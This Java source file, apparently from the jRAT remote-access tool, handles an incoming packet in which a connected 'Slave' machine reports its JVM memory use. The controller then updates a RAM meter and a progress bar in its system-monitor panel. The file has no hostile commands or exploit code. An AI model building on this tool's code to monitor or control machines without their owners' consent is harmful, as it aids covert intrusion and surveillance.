package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.common.utils.MathUtils;
import pro.jrat.ui.frames.FrameControlPanel;
import pro.jrat.ui.panels.PanelControlPerformance;


public class Packet24JVMMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		long MB = slave.readLong();
		long MAX = slave.readLong();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);	
		if (frame != null) {
			PanelControlPerformance panel = (PanelControlPerformance) frame.panels.get("system monitor");
			
			if (panel != null) {
				panel.ramMeter.values.add(0, Integer.parseInt(MB + ""));
				if (Integer.parseInt(MB + "") > panel.ramMeter.maxram) {
					panel.ramMeter.maxram = Integer.parseInt(MAX + "");
				}
				if (frame.getTabbedPane().getTitleAt(1).equals("System Info") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.panelRAM.image = panel.ramMeter.generate(panel.panelRAM.getWidth(), panel.panelRAM.getHeight());
					
					panel.panelRAM.paintComponent(panel.panelRAM.getGraphics());
				}
				panel.barRAM.setValue(MathUtils.getPercentFromTotal((int) MB, (int) MAX));
			}			
		}

	}

}
